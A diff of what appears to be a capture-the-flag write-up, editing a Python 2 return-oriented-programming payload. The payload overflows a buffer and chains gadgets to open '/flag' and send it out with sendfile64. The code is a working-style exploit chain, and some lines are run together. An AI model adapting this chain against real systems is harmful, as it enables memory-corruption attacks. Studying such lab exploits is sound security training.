@@ -65,14 +65,18 @@ print p
 ```
 
 ```
-# sendfile64 0x7ffff7ed6100 # open64 0x7ffff7ed0e50  
-# .date 0x0000000000404030 p = ''
+#!/usr/bin/env python2 
+from struct import pack
+
+# sendfile64 # open64  
+# .date  
+p = ''
 
 p += "A"*56  
 p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
 p += pack('<Q', 0x0000000000404028) # @ .data  
 p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret  
-p += '/flag'  
+p += '/flag' 
 p += pack('<Q', 0x00007ffff7e716eb) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
 p += pack('<Q', 0x0000000000000000) # 0  
 p += pack('<Q', 0x000000000010e030) # open64  
@@ -86,7 +90,7 @@ p += pack('<Q', 0x0000000000000001) # 1
 p += pack('<Q', 0x00007ffff7ee2431) # pop rdx ; pop r12 ; ret  
 p += pack('<Q', 0x0000000000000000) # 0  
 p += pack('<Q', 0x0000000000000001) # 1  
-p += pack('<Q', 0x00007ffff7e5f822) # pop rcx ; ret  
+p += pack('<Q', 0x00007ffff7ee1f6f) # pop rcx ; ret  
 p += pack('<Q', 0x0000000000000050) # 80  
 p += pack('<Q', 0x00000000001131c0) # sendfile64  
 p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
